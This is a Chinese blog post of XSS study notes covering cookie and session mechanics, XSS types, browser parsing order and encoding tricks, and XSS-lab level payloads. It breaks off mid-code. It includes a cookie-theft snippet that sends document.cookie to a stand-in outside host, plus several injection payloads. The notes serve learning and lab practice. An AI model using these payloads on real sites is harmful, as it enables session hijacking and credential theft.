



<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="Hexo" href="http://example.com/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="Hexo" href="http://example.com/atom.xml" />
<link rel="alternate" type="application/json" title="Hexo" href="http://example.com/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  
  <meta name="keywords" content="XSS" />


<link rel="canonical" href="http://example.com/2022/02/17/XSS/">



  <title>
XSS - web安全 |
Yume Shoka = Hexo</title>
<meta name="generator" content="Hexo 5.4.2"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">XSS
  </h1>
  
<div class="meta">
  <span class="item" title="Created: 2022-02-17 13:38:45">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">Posted on</span>
    <time itemprop="dateCreated datePublished" datetime="2022-02-17T13:38:45+08:00">2022-02-17</time>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="Toggle navigation bar">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">Yume Shoka</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
        <ul>
          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicli9lfebj20zk0m84qp.jpg"></li>
          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicitspjpbj20zk0m81ky.jpg"></li>
          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclip4jbpj20zk0m87cv.jpg"></li>
          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclga70tsj20zk0m84mr.jpg"></li>
          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipet8c1a2j20zk0m8kct.jpg"></li>
          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipew28b65j20zk0m8hdt.jpg"></li>
        </ul>
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="item" rel="index" title="In web安全"><span itemprop="name">web安全</span></a>
<meta itemprop="position" content="1" /></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
  <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/17/XSS/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="John Doe">
    <meta itemprop="description" content=", ">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Hexo">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <h1 id="xss"><a class="markdownIt-Anchor" href="#xss">#</a> XSS</h1>
<h2 id="session-cookie"><a class="markdownIt-Anchor" href="#session-cookie">#</a> session || cookie</h2>
<p>1.Cookie 的工作原理<br>
（1）浏览器端第一次发送请求到服务器端</p>
<p>（2）服务器端创建 Cookie，该 Cookie 中包含用户的信息，然后将该 Cookie 发送到浏览器端</p>
<p>（3）浏览器端再次访问服务器端时会携带服务器端创建的 Cookie</p>
<p>（4）服务器端通过 Cookie 中携带的数据区分不同的用户</p>
<p>————————————————</p>
<p>2.Session 的工作原理</p>
<p>（1）浏览器端第一次发送请求到服务器端，服务器端创建一个 Session，同时会创建一个特殊的 Cookie（name 为 JSESSIONID 的固定值，value 为 session 对象的 ID），然后将该 Cookie 发送至浏览器端</p>
<p>（2）浏览器端发送第 N（N&gt;1）次请求到服务器端，浏览器端访问服务器端时就会携带该 name 为 JSESSIONID 的 Cookie 对象</p>
<p>（3）服务器端根据 name 为 JSESSIONID 的 Cookie 的 value (sessionId), 去查询 Session 对象，从而区分不同用户。</p>
<p>name 为 JSESSIONID 的 Cookie 不存在（关闭或更换浏览器），返回 1 中重新去创建 Session 与特殊的 Cookie</p>
<p>name 为 JSESSIONID 的 Cookie 存在，根据 value 中的 SessionId 去寻找 session 对象</p>
<p>value 为 SessionId 不存在 **（Session 对象默认存活 30 分钟）**，返回 1 中重新去创建 Session 与特殊的 Cookie</p>
<p>value 为 SessionId 存在，返回 session 对象</p>
<p>————————————————</p>
<p>(1) cookie 数据存放在客户的浏览器上，session 数据放在服务器上，但是服务端的 session 的实现对客户端的 cookie 有依赖关系的；</p>
<p>(2) cookie 不是很安全，别人可以分析存放在本地的 COOKIE 并进行 COOKIE 欺骗，如果主要考虑到安全应当使用 session</p>
<p>(3) session 会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能，如果主要考虑到减轻服务器性能方面，应当使用 COOKIE</p>
<p>(4) 单个 cookie 在客户端的限制是 3K，就是说一个站点在客户端存放的 COOKIE 不能 3K。</p>
<p>(5) 所以：将登陆信息等重要信息存放为 SESSION; 其他信息如果需要保留，可以放在 COOKIE 中</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NoZW4xMzMzMzMzNjY3Ny9hcnRpY2xlL2RldGFpbHMvMTAwOTM5MDMw">(62 条消息) Cookie 和 Session 的区别（面试必备）_秋风不识路的博客 - CSDN 博客_cookie 与 session 区别</span></p>
<h2 id="1反射型xss"><a class="markdownIt-Anchor" href="#1反射型xss">#</a> 1. 反射型 xss</h2>
<p>反射型 XSS 是非持久性、参数型的跨站脚本。反射型 XSS 的 JS 代码在 Web 应用的参数（变量）中，如搜 索框的反射型 XSS。在搜索框中，提交 PoC [scriptalert (/xss/)/script]，点击搜索，即可触发反射型 XSS。 注意到，我们提交的 poc 会出现在 search.php 页面的 keywords 参数中。</p>
<h2 id="2存储型xss"><a class="markdownIt-Anchor" href="#2存储型xss">#</a> 2. 存储型 XSS</h2>
<p>存储型 XSS 是持久性跨站脚本。持久性体现在 XSS 代码不是在某个参数（变量）中，而是写进数据库或 文件等可以永久保存数据的介质中。存储型 XSS 通常发生在留言板等地方。我们在留言板位置留言，将 恶意代码写进数据库中。此时，我们只完成了第一步，将恶意代码写入数据库。因为 XSS 使用的 JS 代 码，JS 代码的运行环境是浏览器，所以需要浏览器从服务器载入恶意的 XSS 代码，才能真正触发 XSS。 此时，需要我们模拟网站后台管理员的身份，查看留言。</p>
<h2 id="3基于dom的"><a class="markdownIt-Anchor" href="#3基于dom的">#</a> 3. 基于 DOM 的</h2>
<p>XSS DOM XSS 比较特殊。owasp 关于 DOM 型号 XSS 的定义是基于 DOM 的 XSS 是一种 XSS 攻击，其中攻击 的 payload 由于修改受害者浏览器页面的 DOM 树而执行的。其特殊的地方就是 payload 在浏览器本地修 改 DOM 树而执行， 并不会传到服务器上，这也就使得 DOM XSS 比较难以检测。</p>
<p>URL 的每一个参数、URL 本身、表单、搜索框、常见业务场景 重灾区：评论区、留言区、个人信息、订单信息等 针对型：站内信、网页即时通讯、私信、意见反馈 存在风险：搜索框、当前目录、图片属性等</p>
<h2 id="浏览器解析机制"><a class="markdownIt-Anchor" href="#浏览器解析机制">#</a> 浏览器解析机制</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.&lt;a href=<span class="string">&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;</span>&gt;aaa&lt;/a&gt;</span><br><span class="line"><span class="comment">// 解析不了,href后的编码会使用实体编码解析，不能解析url编码</span></span><br><span class="line">http:<span class="comment">//127.0.0.1:18888/javascript:alert%281%29</span></span><br><span class="line">URL 编码 <span class="string">&quot;javascript:alert(1)&quot;</span></span><br><span class="line"><span class="number">2</span>.&lt;a href=<span class="string">&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;</span>&gt;</span><br><span class="line">HTML字符实体编码 <span class="string">&quot;javascript&quot;</span> 和 URL 编码 <span class="string">&quot;alert(2)&quot;</span></span><br><span class="line">  JavaScript支持Unicode，hex，utf-<span class="number">16</span></span><br><span class="line"><span class="number">3</span>.&lt;a href=<span class="string">&quot;javascript%3aalert(3)&quot;</span>&gt;&lt;/a&gt;</span><br><span class="line">URL 编码 <span class="string">&quot;:&quot;</span></span><br><span class="line">  js不能编码符号</span><br><span class="line"><span class="number">4</span>.&lt;div&gt;&amp;<span class="comment">#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;</span></span><br><span class="line">HTML字符实体编码 &lt; 和 &gt;</span><br><span class="line">  会解析但不会执行</span><br><span class="line"><span class="number">5</span>.&lt;textarea&gt;&amp;<span class="comment">#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;</span></span><br><span class="line">HTML字符实体编码 &lt; 和 &gt;</span><br><span class="line">    会解析但不会执行</span><br><span class="line"><span class="number">6</span>.&lt;textarea&gt;&lt;script&gt;<span class="title function_ invoke__">alert</span>(<span class="number">6</span>)&lt;/script&gt;&lt;/textarea&gt;</span><br><span class="line">    会解析但不会执行</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;!-- 不能解析 --&gt;</span><br><span class="line">    &lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;aaa&lt;/a&gt;&lt;br&gt;   </span><br><span class="line">    &lt;a href=&quot;javascript%3aalert(3)&quot;&gt;&lt;/a&gt;</span><br><span class="line">    &lt;!-- js中符号不能编码 --&gt;</span><br><span class="line">    &lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;&lt;br&gt;</span><br><span class="line">    &lt;!-- html解析完不能执行，&lt;不能编码，浏览器中直接显示img标签 --&gt;</span><br><span class="line">    &lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;&lt;br&gt;</span><br><span class="line">    &lt;!-- textarea中的标签可以被解码，但不能被解析，&lt;script&gt;alert(5)&lt;/script&gt; --&gt;</span><br><span class="line">    &lt;textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;&lt;/textarea&gt;&lt;br&gt;</span><br><span class="line">    &lt;!-- textarea中所有标签都不能被解析 --&gt;</span><br><span class="line">    &lt;button onclick=&quot;confirm(&#x27;8\u0027);&quot;&gt;Button&lt;/button&gt;&lt;br&gt;</span><br><span class="line">    &lt;!-- 不能编码符号 --&gt;</span><br><span class="line">    &lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt;</span><br><span class="line">    &lt;!-- 原始字符块只能容纳文本，会被解析为文本 --&gt;</span><br><span class="line">    &lt;script&gt;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029&lt;/script&gt;</span><br><span class="line">    &lt;!-- 不能对()及其里面的内容编码 --&gt;</span><br><span class="line">    &lt;script&gt;\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)&lt;/script&gt;</span><br><span class="line">    &lt;!-- 同理 --&gt;</span><br><span class="line">    &lt;script&gt;alert(&#x27;14\u000a)&lt;/script&gt;</span><br><span class="line">    &lt;!-- Unicode 编码换行符（0x0A）,但不会引起真正的换行 --&gt;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;!-- 可以解析 --&gt;</span><br><span class="line">    &lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;bbb&lt;/a&gt;&lt;br&gt;</span><br><span class="line">    &lt;!-- 直接通过html解析 --&gt;</span><br><span class="line">    &lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt;ccc&lt;/a&gt;&lt;br&gt;</span><br><span class="line">    &lt;!-- 通过html解析为javascript，js在解析url编码 --&gt;</span><br><span class="line">    &lt;button onclick=&quot;confirm(&#x27;7&amp;#39;);&quot;&gt;Button&lt;/button&gt;&lt;br&gt;</span><br><span class="line">    &lt;!-- 先html解析，编码，再给js解析 --&gt;</span><br><span class="line">    &lt;script&gt;\u0061\u006c\u0065\u0072\u0074(10);&lt;/script&gt;</span><br><span class="line">    &lt;!-- 编码alert，函数名可以解析 --&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    在解析一篇HTML文档时主要有三个处理过程：HTML解析，URL解析和JavaScript解析</span><br><span class="line">    一个HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个&#x27;&lt;&#x27;符号&#x27;（后面没有跟&#x27;/&#x27;符号）&#x27;就会进入“标签开始状态(Tag open state)”。然后转变到“标签名状态(Tag name state)”，“前属性名状态(before attribute name state)”......最后进入“数据状态(Data state)”并释放当前标签的token。当解析器处于“数据状态(Data state)”时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。</span><br><span class="line">    &lt;input value=&quot;xxx&quot;&gt;  由于没有&gt;,value中的内容无法进入数据状态解析</span><br><span class="line">    &lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;&lt;br&gt;  </span><br><span class="line">    &lt;textarea&gt;由于有完整的&lt;&gt;，因此可以解析后面的内容，把&amp;#60解析为&lt;,但不会进入数据开始状态</span><br><span class="line">    不能对协议类型进行任何的编码操作&#x27;</span><br><span class="line">    Unicode转义序列只有在标识符名称里不被当作字符串，也只有在标识符名称里的编码字符能够被正常的解析。</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>总结：</p>
<p>浏览器解析顺序：URL 解析器 -&gt;HTML 解析器 -&gt; CSS 解析器 -&gt;JS 解析器</p>
<p>不能对协议进行编码 javascript:   (包含：)</p>
<h3 id="html解析"><a class="markdownIt-Anchor" href="#html解析">#</a> HTML 解析</h3>
<p>一个 HTML 解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个’&lt;‘符号（后面没有跟’/' 符号）就会进入 <code>“标签开始状态(Tag open state)”</code> 。然后转变到 <code>“标签名状态(Tag name state)”</code> ， <code>“前属性名状态(before attribute name state)”</code> … 最后进入 <code>“数据状态(Data state)”</code>  并释放当前标签的 token。当解析器处于 “数据状态 (Data state)” 时，它会继续解析，每当发现一个完整的标签，就会释放出一个 token。</p>
<p>在 HTML 中有五类元素：</p>
<ol>
<li>
<p>空元素 (Void elements)，如<area>,<base>等等</p>
</li>
<li>
<p>原始文本元素 (Raw text elements)，有<script>和<style></p>
</li>
<li>
<p>RCDATA 元素 (RCDATA elements)，有<textarea>和<title></p>
</li>
<li>
<p>外部元素 (Foreign elements)，例如 MathML 命名空间或者 SVG 命名空间的元素</p>
</li>
<li>
<p>基本元素 (Normal elements)，即除了以上 4 种元素以外的元素</p>
</li>
</ol>
<p>五类元素的区别如下：</p>
<ol>
<li>
<p>空元素，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。</p>
</li>
<li>
<p>原始文本元素，可以容纳文本。</p>
</li>
<li>
<p>RCDATA 元素，可以容纳文本和字符引用。</p>
</li>
<li>
<p>外部元素，可以容纳文本、字符引用、CDATA 段、其他元素和注释</p>
</li>
<li>
<p>基本元素，可以容纳文本、字符引用、其他元素和注释</p>
</li>
</ol>
<p>如果我们回头看 HTML 解析器的规则，其中有一种可以容纳字符引用的情况是 “RCDATA 状态中的字符引用”。这意味着在<textarea>和<title>标签中的字符引用会被 HTML 解析器解码。这里要再提醒一次，在解析这些字符引用的过程中不会进入 “标签开始状态”。这样就可以解释问题 5 了。另外，对 RCDATA 有个特殊的情况。在浏览器解析 RCDATA 元素的过程中，解析器会进入 “RCDATA 状态”。在这个状态中，如果遇到 “&lt;” 字符，它会转换到 “RCDATA 小于号状态”。如果 “&lt;” 字符后没有紧跟着 “/” 和对应的标签名，解析器会转换回 “RCDATA 状态”。这意味着在 RCDATA 元素标签的内容中（例如<textarea>或<title>的内容中），唯一能够被解析器认做是标签的就是 “</textarea>” 或者 “</title>”。因此，在 “<textarea>” 和 “<title>” 的内容中不会创建标签，就不会有脚本能够执行。这也就解释了为什么问题 6 中的脚本不会被执行。</p>
<h3 id="url解析"><a class="markdownIt-Anchor" href="#url解析">#</a> URL 解析</h3>
<p>首先，URL 资源类型必须是 ASCII 字母（U+0041-U+005A || U+0061-U+007A），不然就会进入 “无类型” 状态。例如， <code>你不能对协议类型进行任何的编码操作</code> ，不然 URL 解析器会认为它无类型。这就是为什么问题 1 中的代码不能被执行。因为 URL 中被编码的 “javascript” 没有被解码，因此不会被 URL 解析器识别。该原则对协议后面的 “：”（冒号）同样适用，即问题 3 也得到解答。然而，你可能会想到：为什么问题 2 中的脚本被执行了呢？如果你记得我们在 HTML 解析部分讨论的内容的话，是否还记得有一个情况叫做 “属性值中的字符引用”，在这个情况中字符引用会被解码。我们将稍后讨论解析顺序，但在这里，HTML 解析器解析了文档，创建了标签 token，并且对 href 属性里的字符实体进行了解码。然后，当 HTML 解析器工作完成后，URL 解析器开始解析 href 属性值里的链接。在这时，“javascript” 协议已经被解码，它能够被 URL 解析器正确识别。然后 URL 解析器继续解析链接剩下的部分。由于是 “javascript” 协议，JavaScript 解析器开始工作并执行这段代码，这就是为什么问题 2 中的代码能够被执行。</p>
<h3 id="javascript解析"><a class="markdownIt-Anchor" href="#javascript解析">#</a> JavaScript 解析</h3>
<p>那像 “\uXXXX”（例如 \u0000,\u000A）这样的字符呢，JavaScript 会解析这些字符来执行吗？简单的说：视情况而定。具体的说就是要看被编码的序列到底是哪部分。首先，像 \uXXXX 一样的字符被称作 Unicode 转义序列。从上下文来看，你可以将转义序列放在 3 个部分：字符串中，标识符名称中和控制字符中。</p>
<p>字符串中：当 Unicode 转义序列存在于字符串中时，它只会被解释为正规字符，而不是单引号，双引号或者换行符这些能够打破字符串上下文的字符。这项内容清楚地写在 ECMAScript 中。因此，Unicode 转义序列将永远不会破环字符串上下文，因为它们只能被解释成字符串常量。</p>
<p>标识符名称中：当 Unicode 转义序列出现在标识符名称中时，它会被解码并解释为标识符名称的一部分，例如函数名，属性名等等。这可以用来解释问题 10。如果我们深入研究 JavaScript 细则，可以看到如下内容：</p>
<p>“Unicode 转义序列（如 \u000A\u000B）同样被允许用在标识符名称中，被当作名称中的一个字符。而将’' 符号前置在 Unicode 转义序列串（如 \u000A000B000C）并不能作为标识符名称中的字符。将 Unicode 转义序列串放在标识符名称中是非法的。”</p>
<p>总的来说，Unicode 转义序列只有在标识符名称里不被当作字符串，也只有在标识符名称里的编码字符能够被正常的解析。如果我们回看问题 11，它并不会被执行。因为 “(11)” 不会被正确的解析，而 “alert (11)” 也不是一个有效的标识符名称。问题 12 不会被正确执行要么是因为’\u0031\u0032’不会被解释为字符串常量（因为它们没有用引号闭合）要么是因为它们是 ASCII 型数字。问题 13 不会执行的原因是’\u0027’仅仅会被解释成单引号文本，而此时字符串是未闭合的。问题 14 能够执行的原因是’\u000a’会被解释成换行符文本，这并不会导致真正的换行从而引发 JavaScript 语法错误。</p>
<p>即 () 和 里面的东西都不能编码</p>
<h2 id="xss攻击方式"><a class="markdownIt-Anchor" href="#xss攻击方式">#</a> XSS 攻击方式</h2>
<h3 id="1读取浏览器cookie对象发起cookie劫持"><a class="markdownIt-Anchor" href="#1读取浏览器cookie对象发起cookie劫持">#</a> 1. 读取浏览器 cookie 对象，发起 cookie 劫持</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var img = document.createElement(&quot;img&quot;);</span><br><span class="line">img.src = &quot;http://www.eval.com/log?&quot; + escape(document.cookie);</span><br><span class="line">document.body.append(img);</span><br></pre></td></tr></table></figure>
<p>使用 httponly 标识可以防止 cookie 劫持</p>
<h3 id="2模拟postget请求操作用户的浏览器"><a class="markdownIt-Anchor" href="#2模拟postget请求操作用户的浏览器">#</a> 2. 模拟 POST，GET 请求操作用户的浏览器</h3>
<p>在 cookie 劫持失效时或是在目标用户的网络不能访问互联网时</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.抓包分析浏览器发送的请求</span><br><span class="line">2.构造完整url，使用XMLHTTPRequest或者form表单请求此url</span><br></pre></td></tr></table></figure>
<h3 id="3xss钓鱼"><a class="markdownIt-Anchor" href="#3xss钓鱼">#</a> 3.XSS 钓鱼</h3>
<p>通过伪造登录框获取用户的用户名和密码，在将密码和用户名发送到自己服务器上</p>
<h3 id="4获取用户信息"><a class="markdownIt-Anchor" href="#4获取用户信息">#</a> 4. 获取用户信息</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.识别用户浏览器，根据每个浏览器特有的功能</span><br><span class="line">2.识别用户安装的软件或浏览器插件</span><br><span class="line">3.查询用户访问过的连接</span><br><span class="line">4.获取用户真实IP</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="xsslab"><a class="markdownIt-Anchor" href="#xsslab">#</a> XSSlab</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veHl6MzE1L3AvMTQ4NTAzNTkuaHRtbA==">https://www.cnblogs.com/xyz315/p/14850359.html</span></p>
<p>Level - 1</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.1.6:18888/xss/level1.php?name=test</span></span><br><span class="line"></span><br><span class="line">?name=&lt;script&gt;<span class="title function_ invoke__">alert</span>(<span class="number">1</span>)</span><br><span class="line">?name=&lt;input onclick/onmouseover&gt;</span><br><span class="line">?name=&lt;a onclick/javascript&gt;</span><br><span class="line">?name=&lt;img src&gt;</span><br><span class="line">?name=&lt;iframe&gt;</span><br><span class="line">?name=&lt;svg&gt;</span><br><span class="line">?name=&lt;video onloadstart=<span class="title function_ invoke__">alert</span>(<span class="number">1</span>) src=<span class="string">&quot;/media/hack-the-plant.mp4&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<p>闭合 大小写 双写 编码</p>
<p>Level 10</p>
<p>?keyword=111&amp;t_sort=1 type=“text” onclick=alert(1)</p>
<p>?keyword=111&amp;t_sort=1 type=“text” onfocus=alert(1) autofocus=&quot;true</p>
<p>Level 11</p>
<p>Post 提交 referer</p>
<h2 id="模板字符串"><a class="markdownIt-Anchor" href="#模板字符串">#</a> 模板字符串</h2>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span 